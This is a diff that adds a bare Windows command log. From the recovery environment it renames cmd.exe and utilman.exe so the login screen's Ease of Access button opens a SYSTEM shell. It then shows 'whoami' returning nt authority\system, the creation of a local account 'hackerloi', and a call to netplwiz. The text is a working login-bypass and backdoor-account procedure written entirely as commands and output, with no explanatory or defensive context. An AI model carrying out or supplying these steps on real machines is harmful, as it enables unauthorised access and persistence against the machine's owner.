@@ -1,0 +1,22 @@
+
+X:\Sources>cd
+
+X:\Sources>cd Windows
+
+X:\Windows>cd System32
+
+X:\Windows\System32>ren cmd.exe utilman2.exe
+
+X:\Windows\System32>ren utilman.exe cmd.exe
+
+X:\Windows\System32>ren utilman2.exe utilman.exe
+
+
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>net user hackerloi hackerloi /add
+The command completed successfully.
+
+C:\Windows\system32>netplwiz
